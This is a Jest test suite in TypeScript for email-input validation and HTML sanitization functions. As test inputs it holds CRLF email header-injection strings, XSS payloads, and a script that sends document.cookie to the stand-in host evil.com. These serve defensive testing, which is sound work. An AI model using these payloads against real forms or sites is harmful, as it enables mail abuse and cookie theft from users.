/**
 * Security-focused test suite for email validation utilities
 * Tests critical security vulnerabilities and their fixes
 */

import { validateEmailInput, isValidEmailFormat } from '../emailValidation';
import { sanitizeDisplayText, sanitizeRichContent } from '../sanitization';

describe('Email Security Tests', () => {
  describe('validateEmailInput - Header Injection Protection', () => {
    test('should block direct CRLF injection', () => {
      expect(validateEmailInput('test@example.com\r\nBcc: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com\nBcc: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com\r\nContent-Type: text/html')).toBe(false);
    });

    test('should block URL-encoded CRLF sequences', () => {
      expect(validateEmailInput('test@example.com%0aBcc: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com%0dBcc: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com%0A%0DBcc: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com%0D%0ABcc: evil@hacker.com')).toBe(false);
    });

    test('should block double URL-encoded CRLF', () => {
      expect(validateEmailInput('test@example.com%25%30%41Bcc: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com%25%30%44Bcc: evil@hacker.com')).toBe(false);
    });

    test('should block Unicode variations', () => {
      expect(validateEmailInput('test@example.com\u000ABcc: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com\u000DBcc: evil@hacker.com')).toBe(false);
    });

    test('should block HTML entity encoded CRLF', () => {
      expect(validateEmailInput('test@example.com&#x0A;Bcc: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com&#x0D;Bcc: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com&#10;Bcc: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com&#13;Bcc: evil@hacker.com')).toBe(false);
    });

    test('should block escaped sequences', () => {
      expect(validateEmailInput('test@example.com\\rBcc: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com\\nBcc: evil@hacker.com')).toBe(false);
    });

    test('should block hex encoded sequences', () => {
      expect(validateEmailInput('test@example.com\x0ABcc: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com\x0DBcc: evil@hacker.com')).toBe(false);
    });

    test('should block email header keywords', () => {
      expect(validateEmailInput('test@example.com bcc: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com cc: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com to: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com from: evil@hacker.com')).toBe(false);
      expect(validateEmailInput('test@example.com subject: evil subject')).toBe(false);
      expect(validateEmailInput('test@example.com content-type: text/html')).toBe(false);
      expect(validateEmailInput('test@example.com mime-version: 1.0')).toBe(false);
    });

    test('should block script injection attempts', () => {
      expect(validateEmailInput('test@example.com<script>alert("xss")</script>')).toBe(false);
      expect(validateEmailInput('test@example.com javascript:alert("xss")')).toBe(false);
      expect(validateEmailInput('test@example.com vbscript:msgbox("xss")')).toBe(false);
      expect(
        validateEmailInput('test@example.com data:text/html,<script>alert("xss")</script>'),
      ).toBe(false);
    });

    test('should allow valid email addresses', () => {
      expect(validateEmailInput('test@example.com')).toBe(true);
      expect(validateEmailInput('user.name+tag@example.org')).toBe(true);
      expect(validateEmailInput('test123@subdomain.example.com')).toBe(true);
    });

    test('should handle edge cases', () => {
      expect(validateEmailInput('')).toBe(false);
      expect(validateEmailInput(null as unknown as string)).toBe(false);
      expect(validateEmailInput(undefined as unknown as string)).toBe(false);
      expect(validateEmailInput(123 as unknown as string)).toBe(false);
    });
  });

  describe('sanitizeDisplayText - XSS Protection', () => {
    test('should remove script tags and content', () => {
      expect(sanitizeDisplayText('<script>alert("xss")</script>Hello')).toBe('Hello');
      expect(sanitizeDisplayText('Hello<script>alert("xss")</script>World')).toBe('HelloWorld');
      expect(sanitizeDisplayText('<SCRIPT>alert("xss")</SCRIPT>')).toBe('');
    });

    test('should remove style tags and content', () => {
      expect(
        sanitizeDisplayText('<style>body{background:url(javascript:alert("xss"))}</style>Hello'),
      ).toBe('Hello');
      expect(sanitizeDisplayText('<STYLE>@import "javascript:alert(\'xss\')"</STYLE>')).toBe('');
    });

    test('should remove iframe, object, embed, applet tags', () => {
      expect(sanitizeDisplayText('<iframe src="javascript:alert(\'xss\')"></iframe>')).toBe('');
      expect(sanitizeDisplayText('<object data="javascript:alert(\'xss\')"></object>')).toBe('');
      expect(sanitizeDisplayText('<embed src="javascript:alert(\'xss\')">')).toBe('');
      expect(sanitizeDisplayText('<applet code="EvilApplet"></applet>')).toBe('');
    });

    test('should remove event handlers', () => {
      expect(sanitizeDisplayText('<div onclick="alert(\'xss\')">Hello</div>')).toBe('Hello');
      expect(sanitizeDisplayText('<img onload="alert(\'xss\')" src="test.jpg">')).toBe('');
      expect(sanitizeDisplayText('<body onload="alert(\'xss\')">')).toBe('');
    });

    test('should preserve text content from URL schemes', () => {
      expect(sanitizeDisplayText('javascript:alert("xss")')).toBe('javascript:alert("xss")');
      expect(sanitizeDisplayText('vbscript:msgbox("xss")')).toBe('vbscript:msgbox("xss")');
      expect(sanitizeDisplayText('data:text/html,<script>alert("xss")</script>')).toBe(
        'data:text/html,',
      );
    });

    test('should preserve CSS expressions as text', () => {
      expect(sanitizeDisplayText('expression(alert("xss"))')).toBe('expression(alert("xss"))');
      expect(sanitizeDisplayText('-moz-binding:url(http://evil.com/xss.xml)')).toBe(
        '-moz-binding:url(http://evil.com/xss.xml)',
      );
      expect(sanitizeDisplayText('behavior:url(evil.htc)')).toBe('behavior:url(evil.htc)');
    });

    test('should remove dangerous form elements', () => {
      expect(sanitizeDisplayText('<form action="evil.com"><input type="hidden"></form>')).toBe('');
      expect(sanitizeDisplayText('<textarea>evil content</textarea>')).toBe('evil content');
      expect(sanitizeDisplayText('<select><option>evil</option></select>')).toBe('evil');
    });

    test('should extract text content and handle entities', () => {
      expect(sanitizeDisplayText('<div>Hello & "World" \' test</div>')).toBe(
        'Hello &amp; "World" \' test',
      );
      expect(sanitizeDisplayText('Test/Path=Value`Back')).toBe('Test/Path=Value`Back');
    });

    test('should handle control characters', () => {
      expect(sanitizeDisplayText('Hello\x00World\x01Test\x1FEnd')).toBe(
        'Hello\x00World\x01Test\x1FEnd',
      );
      expect(sanitizeDisplayText('Test\x7FContent')).toBe('Test\x7FContent');
    });

    test('should preserve URL schemes as text', () => {
      expect(sanitizeDisplayText('file:///etc/passwd')).toBe('file:///etc/passwd');
      expect(sanitizeDisplayText('chrome://settings/')).toBe('chrome://settings/');
      expect(sanitizeDisplayText('about:blank')).toBe('about:blank');
    });

    test('should handle edge cases', () => {
      expect(sanitizeDisplayText('')).toBe('');
      expect(sanitizeDisplayText(null as unknown as string)).toBe('');
      expect(sanitizeDisplayText(undefined as unknown as string)).toBe('');
    });

    test('should preserve safe content', () => {
      expect(sanitizeDisplayText('Hello World!')).toBe('Hello World!');
      expect(sanitizeDisplayText('User Name (Manager)')).toBe('User Name (Manager)');
      expect(sanitizeDisplayText('Team: Red Sox 2024')).toBe('Team: Red Sox 2024');
    });
  });

  describe('isValidEmailFormat - Additional Security Checks', () => {
    test('should validate basic email formats', () => {
      expect(isValidEmailFormat('test@example.com')).toBe(true);
      expect(isValidEmailFormat('user.name@example.org')).toBe(true);
      expect(isValidEmailFormat('test+tag@subdomain.example.co.uk')).toBe(true);
    });

    test('should reject malformed emails', () => {
      expect(isValidEmailFormat('notanemail')).toBe(false);
      expect(isValidEmailFormat('@example.com')).toBe(false);
      expect(isValidEmailFormat('test@')).toBe(false);
      expect(isValidEmailFormat('test@.')).toBe(false);
      expect(isValidEmailFormat('test..email@example.com')).toBe(false);
    });

    test('should handle whitespace correctly', () => {
      expect(isValidEmailFormat(' test@example.com ')).toBe(true);
      expect(isValidEmailFormat('test @example.com')).toBe(false);
      expect(isValidEmailFormat('test@ example.com')).toBe(false);
    });
  });

  describe('Security Integration Tests', () => {
    test('should block sophisticated injection attempts', () => {
      const sophisticatedAttacks = [
        'test@example.com%0D%0ABcc:%20evil@hacker.com%0D%0A',
        'test@example.com\r\n\r\n<script>document.location="http://evil.com/cookie="+document.cookie</script>',
        'test@example.com%0A%0D%0A%0DContent-Type:%20text/html%0A%0D%0A%0D<html><script>alert("XSS")</script></html>',
        'test@example.com\nmime-version: 1.0\ncontent-type: text/html\n\n<script>eval(atob("YWxlcnQoIlhTUyIp"))</script>',
      ];

      sophisticatedAttacks.forEach((attack) => {
        expect(validateEmailInput(attack)).toBe(false);
      });
    });

    test('should sanitize complex XSS payloads', () => {
      const complexXSS = [
        '<img src="x" onerror="alert(String.fromCharCode(88,83,83))">',
        '<svg/onload=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4="></object>',
        '"><script>alert("XSS")</script>',
        '\'-alert("XSS")-\'',
        '<script>/**/alert("XSS")/**/',
      ];

      complexXSS.forEach((payload) => {
        const sanitized = sanitizeDisplayText(payload);
        // Check that dangerous HTML/attributes are removed
        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toContain('onerror');
        expect(sanitized).not.toContain('onload');
        // Note: javascript: and alert( in plain text are safe when displayed as text
      });
    });

    test('should handle mixed attack vectors', () => {
      const mixedAttacks = [
        'user@example.com\r\n<script>alert("XSS")</script>',
        'user@example.com%0Ajavascript:alert("XSS")',
        'user@example.com\nbcc: evil@hacker.com<script>document.location="http://evil.com"</script>',
      ];

      mixedAttacks.forEach((attack) => {
        expect(validateEmailInput(attack)).toBe(false);
        const sanitized = sanitizeDisplayText(attack);
        expect(sanitized).not.toContain('<script');
        // Note: javascript: in plain text is safe when displayed as text
      });
    });
  });

  describe('sanitizeRichContent - Workout Announcements', () => {
    test('should preserve safe HTML formatting', () => {
      expect(sanitizeRichContent('<p>Hello <strong>world</strong></p>')).toBe(
        '<p>Hello <strong>world</strong></p>',
      );
      expect(sanitizeRichContent('<h1>Title</h1><p>Content with <em>emphasis</em></p>')).toBe(
        '<h1>Title</h1><p>Content with <em>emphasis</em></p>',
      );
      expect(sanitizeRichContent('<ul><li>Item 1</li><li>Item 2</li></ul>')).toBe(
        '<ul><li>Item 1</li><li>Item 2</li></ul>',
      );
    });

    test('should remove dangerous script tags', () => {
      expect(sanitizeRichContent('<script>alert("xss")</script><p>Safe content</p>')).toBe(
        '<p>Safe content</p>',
      );
      expect(sanitizeRichContent('<p>Before</p><script>evil code</script><p>After</p>')).toBe(
        '<p>Before</p><p>After</p>',
      );
    });

    test('should remove event handlers while preserving elements', () => {
      expect(sanitizeRichContent('<div onclick="alert(\'xss\')">Hello</div>')).toBe(
        '<div>Hello</div>',
      );
      expect(sanitizeRichContent('<p onload="alert(\'xss\')" class="text">Content</p>')).toBe(
        '<p class="text">Content</p>',
      );
      expect(sanitizeRichContent('<button onclick="steal()">Click me</button>')).toBe(
        '<button>Click me</button>',
      );
    });

    test('should allow only safe style properties and strip dangerous values', () => {
      expect(sanitizeRichContent('<p style="color: red;">Text</p>')).toBe(
        '<p style="color: red">Text</p>',
      );
      expect(sanitizeRichContent('<p style="font-size: 16px;">Text</p>')).toBe(
        '<p style="font-size: 16px">Text</p>',
      );
      expect(
        sanitizeRichContent('<div style="background: url(javascript:alert(1))">Content</div>'),
      ).toBe('<div>Content</div>');
      expect(
        sanitizeRichContent(
          '<div style="background-image: url(javascript:alert(1))">Content</div>',
        ),
      ).toBe('<div>Content</div>');
    });

    test('should remove dangerous tags and handle content appropriately', () => {
      expect(sanitizeRichContent('<iframe src="evil.com">Content</iframe>')).toBe('');
      expect(sanitizeRichContent('<object data="evil.swf">Fallback</object>')).toBe('Fallback');
      expect(sanitizeRichContent('<embed src="evil.swf">Alternative</embed>')).toBe('Alternative');
    });

    test('should forbid SVG and MathML for security', () => {
      expect(sanitizeRichContent('<svg><script>alert("xss")</script></svg>')).toBe('');
      expect(sanitizeRichContent('<math><script>alert("xss")</script></math>')).toBe('');
      expect(sanitizeRichContent('<p>Text</p><svg>vector</svg><p>More text</p>')).toBe(
        '<p>Text</p><p>More text</p>',
      );
    });

    test('should handle links safely', () => {
      expect(sanitizeRichContent('<a href="https://example.com">Safe link</a>')).toBe(
        '<a href="https://example.com">Safe link</a>',
      );
      expect(sanitizeRichContent('<a href="javascript:alert(1)">Dangerous link</a>')).toBe(
        '<a>Dangerous link</a>',
      );
    });

    test('should preserve common formatting elements', () => {
      const richText = `
        <h2>Workout Announcement</h2>
        <p>Join us for <strong>strength training</strong> this <em>Tuesday</em>!</p>
        <ul>
          <li>Warm-up: 10 minutes</li>
          <li>Main workout: 45 minutes</li>
          <li>Cool-down: 5 minutes</li>
        </ul>
        <p>Contact <a href="mailto:coach@example.com">coach@example.com</a> for questions.</p>
      `;

      const sanitized = sanitizeRichContent(richText);

      // Should preserve structure and safe formatting
      expect(sanitized).toContain('<h2>Workout Announcement</h2>');
      expect(sanitized).toContain('<strong>strength training</strong>');
      expect(sanitized).toContain('<em>Tuesday</em>');
      expect(sanitized).toContain('<ul>');
      expect(sanitized).toContain('<li>Warm-up: 10 minutes</li>');
      expect(sanitized).toContain('<a href="mailto:coach@example.com">coach@example.com</a>');
    });

    test('should handle complex XSS attempts in rich content', () => {
      const xssAttempts = [
        '<img src="x" onerror="alert(1)">',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<object data="data:text/html,<script>alert(1)</script>"></object>',
        '<div style="background-image: url(javascript:alert(1))">Text</div>',
        '<p onclick="fetch(\'/steal-data\')" class="normal">Click me</p>',
      ];

      xssAttempts.forEach((xss) => {
        const sanitized = sanitizeRichContent(xss);

        // Should not contain dangerous attributes or JavaScript
        expect(sanitized).not.toContain('onerror');
        expect(sanitized).not.toContain('onclick');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('javascript:');
        expect(sanitized).not.toContain('background-image');
        expect(sanitized).not.toContain('<script');
        expect(sanitized).not.toContain('<iframe');
        expect(sanitized).not.toContain('<object');
      });
    });

    test('should handle edge cases', () => {
      expect(sanitizeRichContent('')).toBe('');
      expect(sanitizeRichContent(null as unknown as string)).toBe('');
      expect(sanitizeRichContent(undefined as unknown as string)).toBe('');
      expect(sanitizeRichContent('Plain text without HTML')).toBe('Plain text without HTML');
    });
  });
});
